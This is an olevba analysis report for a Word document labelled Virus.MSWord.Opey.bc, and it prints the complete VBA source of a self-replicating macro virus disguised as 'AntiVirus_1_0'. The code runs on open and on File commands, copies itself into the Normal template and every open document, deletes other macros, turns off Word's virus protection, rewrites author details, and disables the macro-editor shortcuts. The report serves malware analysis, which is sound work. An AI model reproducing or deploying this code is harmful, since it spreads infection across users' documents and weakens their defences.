olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.bc-510291829c1c2b803116b5c4bd570d4f95954317
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.bc-510291829c1c2b803116b5c4bd570d4f95954317 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AntiVirus_1_0.bas 
in file: Virus.MSWord.Opey.bc-510291829c1c2b803116b5c4bd570d4f95954317 - OLE stream: 'Macros/VBA/AntiVirus_1_0'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------------------
' Company: FoxChit SOFTWARE SOLUTIONS
' Author: Ulysses R. Gotera
' Date Created: March 30, 1999                        Date Revisions: <>
' Note: This macro restores the original toolbars and immunizes other files
' ------------------------------------------------------------------------------------

Sub Immunize()
On Error Resume Next
    
    Dim DocuName$, OpenDocImmunized As Boolean
    Dim I%, J%, NmImmunized As Boolean
    
    NmImmunized = False
        
    For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        DocuName = NormalTemplate.VBProject.VBComponents(I).Name
        If DocuName = "AntiVirus_1_0" Then NmImmunized = True
        If (DocuName <> "AntiVirus_1_0") And _
            (DocuName <> "ThisDocument") Then
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName _
                , Name:=DocuName _
                , Object:=wdOrganizerObjectProjectItems
        End If
    Next I
    
    For Each opendoc In Documents
        OpenDocImmunized = False
        With opendoc
            For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                DocuName = opendoc.VBProject.VBComponents(J).Name
                If DocuName = "AntiVirus_1_0" Then OpenDocImmunized = True
                If (DocuName <> "AntiVirus_1_0") And _
                   (DocuName <> "ThisDocument") And _
                   (DocuName <> "Reference to Normal") Then
                     Application.OrganizerDelete Source:=opendoc.FullName _
                     , Name:=DocuName _
                     , Object:=wdOrganizerObjectProjectItems
                End If
            Next J
            
            If Not OpenDocImmunized Then
                Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=opendoc.FullName, _
                Name:="AntiVirus_1_0", _
                Object:=wdOrganizerObjectProjectItems
                opendoc.SaveAs FileName:=opendoc.FullName
            End If
        End With
    Next opendoc
    
    If Not NmImmunized Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:="AntiVirus_1_0", _
         Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
    
End Sub
Sub Initialize()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros -1
   
    With Application
        .UserName = "Ulysses R. Gotera"
        .UserAddress = "FoxChit SOFTWARE SOLUTIONS"
        .UserInitials = "URG"
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Ulysses R. Gotera"
        .Keywords = "FoxChit SOFTWARE SOLUTIONS"
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   With CommandBars("Tools")
      .reset
      .Controls("Macro").reset
      .Controls("Customize...").reset
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate

End Sub
Sub FileSave()
On Error Resume Next
    Call Initialize
    Call Immunize
    ActiveDocument.Save
End Sub
Sub FileClose()
On Error Resume Next
    Call Initialize
    Call Immunize
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
    Call Initialize
    Call Immunize
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    FoxChitForm.Show
    Application.Quit
End Sub
Sub FileNew()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileNew).Show
    Call Immunize
End Sub
Sub AutoOpen()
On Error Resume Next
   Call Initialize
   Call Immunize
End Sub
Sub AutoExec()
On Error Resume Next
    Call Initialize
    Call Immunize
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
    Call Immunize
End Sub
Sub FileOpen()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

